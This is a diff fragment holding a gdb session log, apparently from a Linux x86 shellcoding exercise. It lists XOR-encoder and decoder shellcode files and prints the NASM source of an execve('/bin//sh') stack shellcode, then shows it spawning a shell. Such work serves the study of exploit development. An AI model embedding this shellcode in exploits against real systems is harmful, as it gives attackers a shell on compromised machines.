+   0x0804a067 <+39>:    int    0x80
+   0x0804a069 <+41>:    add    BYTE PTR [eax],al
+End of assembler dump.
+(gdb) shell ls
+compile_ld.sh         shellcode           shellcode-xor       xor-decoder-marker.nasm  XORencoder.py
+execve-stack-sh       shellcode.c         shellcode-xor.c     xor-decoder-marker.o
+execve-stack-sh.nasm  shellcode-marker    xor-decoder         xor-decoder.nasm
+execve-stack-sh.o     shellcode-marker.c  xor-decoder-marker  xor-decoder.o
+(gdb) shell cat execve-stack-sh.nasm
+; execve-stack.nasm
+
+global _start
+
+section .text
+_start:
+
+        ; PUSH the first null dword
+        xor eax, eax
+        push eax
+
+        ; PUSH /bin//sh (8 bytes)
+
+        push 0x68732f2f
+        push 0x6e69622f
+
+        mov ebx, esp
+
+        push eax
+        mov edx, esp
+
+        push ebx
+        mov ecx, esp
+
+        mov al, 11
+        int 0x80
+(gdb) c
+process 6595 is executing new program: /bin/dash
+$ ps
+  PID TTY          TIME CMD
+ 5761 pts/10   00:00:03 bash
+ 6593 pts/10   00:00:01 gdb
+ 6595 pts/10   00:00:00 sh
+ 6601 pts/10   00:00:00 ps
+$
